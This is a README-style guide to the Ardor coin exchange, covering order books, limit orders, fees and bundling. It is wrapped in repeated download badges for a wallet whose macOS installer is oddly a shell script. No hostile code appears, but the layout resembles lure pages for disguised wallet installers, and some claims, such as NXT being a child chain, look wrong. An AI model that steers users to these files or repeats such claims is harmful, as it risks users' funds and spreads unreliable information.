![Ardor Wallet guide](assets/banner-article.png)

# Trade on the Ardor coin exchange

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor coin exchange is an order book built into the platform: child chain tokens trade against each other and against ARDR, orders are signed by your own wallet, and nothing is held by a middleman while an order waits. A limit order waits in the book until a counterparty takes the other side.

## What the coin exchange is

Most exchanges are companies: you deposit, they credit an internal balance, and their database records the trade. Ardor's coin [exchange](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md) is the opposite. The order book lives on the chain, and each order is a signed transaction from an account you control.

That means there is no deposit step and no withdrawal step. The token stays in your [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) until a trade fills, and the only thing the chain stores is your order. When it executes, both sides settle in the same block.

## What you can trade

| Pair type | Example | Notes |
|---|---|---|
| Child chain token against ARDR | IGNIS / ARDR | The parent chain's token is the common denominator |
| Two child chain tokens | IGNIS / NXT | Cross rates exist through the book rather than a separate market |
| Asset against ARDR or a token | An issued asset / IGNIS | Assets trade on the asset exchange, with the same order book model |

Because everything settles on one platform, the pairs are broader than a single venue's listing sheet would suggest. What determines whether a trade is possible is whether somebody has an order on the other side.

That is the honest limit of the design. There is no listing committee and no market maker obliged to quote, so a pair exists exactly as far as its participants do - and a pair with one order on one side is not a market, however official the [Ardor token](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) sounds.

## Placing an order

1. Open the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and unlock the account holding the token you want to sell.
2. Select the chain that holds the token, since the exchange operates on the selected chain.
3. Open the coin exchange and choose the pair.
4. Enter the amount and the price you are willing to accept, then review the order.
5. Sign and broadcast. The order appears in the book and stays there until it fills or you cancel it.
6. Check the order's state afterwards; a partially filled order remains in the book for the remainder.

Step six is where expectations diverge. A limit order is not a promise of an immediate trade; it is a standing offer that may wait a long time, and the wallet keeps showing it as open precisely because nothing has happened yet.

## Reading the order book

The book shows bids and asks: the prices people are willing to buy at, and the prices people are willing to sell at. The gap between the best of each is the spread, and the size behind each price is the depth.

A thin book is the thing to notice before placing a large order. If the depth on the other side is small, a big order will either wait or fill at progressively worse prices. Checking depth takes seconds and prevents most disappointing trades, which is why it belongs before the order form rather than after it.

## Why the book can be thin

An order book with no market makers depends on holders choosing to post orders. On a small platform that means many pairs have a wide spread and little depth, and a trade that looks trivial on a price chart can move the book several percent.

That is not a defect in the exchange; it is the honest state of a market with few participants. The practical response is to trade smaller than you would on a deep venue, to price orders rather than expecting to hit a mid price, and to accept that some pairs are effectively not tradeable today.

## Fees and bundling

Trading on a child chain pays a fee in that chain's token, and a bundler carries it to the parent chain by paying ARDR. On the parent chain, the fee is paid in ARDR directly.

That is why a trade can fail for a reason that has nothing to do with the price: a fee below the bundler's minimum leaves the order unconfirmed. When an order does not appear at all, check the fee before checking anything else.

## What can go wrong

- An order placed at a price nobody will take simply sits there, and a market that moves away leaves it further from filling.
- A partially filled order keeps the remainder live, which can surprise someone who assumed the trade was finished.
- Placing an order on the wrong chain trades the wrong token, because the exchange follows the selector.
- Cancelling requires a transaction of its own, so a cancelled order is not free.

None of those loses funds. They are the ordinary frictions of an order book with no matching engine behind it, and knowing them in advance is most of the skill involved in using it well.

## FAQ

### Do I need to deposit funds to trade?

No. The order is signed from your account and the token stays there until it trades. There is no exchange balance to fund.

### Can I place a market order?

The exchange is built around limit orders in an order book. To trade immediately, you take an existing order at its price rather than submitting an unpriced one.

### What happens if my order only partly fills?

The filled part settles and the remainder stays in the book until it fills or you cancel it.

### Are there trading fees on top of the network fee?

The network fee applies to the order and to the cancellation. Check the exchange screen for any additional charge before confirming, since the platform's own fee is not the only cost a trade can carry.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Issue an asset or a custom currency on Ardor, and trade it](https://github.com/ardor-software/ardor-platform-guides/blob/main/issue-and-trade-assets-on-ardor.md)
- [How Ardor bundling works](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md)
- [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
